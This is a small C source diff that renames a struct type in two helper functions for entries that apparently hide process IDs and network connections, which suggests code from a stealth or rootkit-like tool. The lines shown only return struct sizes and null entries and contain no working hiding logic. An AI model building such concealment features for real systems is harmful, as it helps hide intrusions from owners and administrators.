@@ -119,7 +119,7 @@ CRITICAL_SECTION hide_critic_sec;
 DWORD AM_HideElemSize(DWORD type)
 {
 	if (type == HIDE_PID)
-		return sizeof(pid_hide_struct);
+		return sizeof(PID_HIDE);
 	else if (type == HIDE_CNN)
 		return sizeof(connection_hide_struct);
 	else
@@ -141,7 +141,7 @@ DWORD AM_HideWrapperTag(DWORD type)
 BYTE *AM_HideNullEntry(DWORD type)
 {
 	static connection_hide_struct connection_hide = NULL_CONNETCION_HIDE_STRUCT;
-	static pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	static PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 
 	if (type == HIDE_PID)
 		return (BYTE *)&pid_hide;
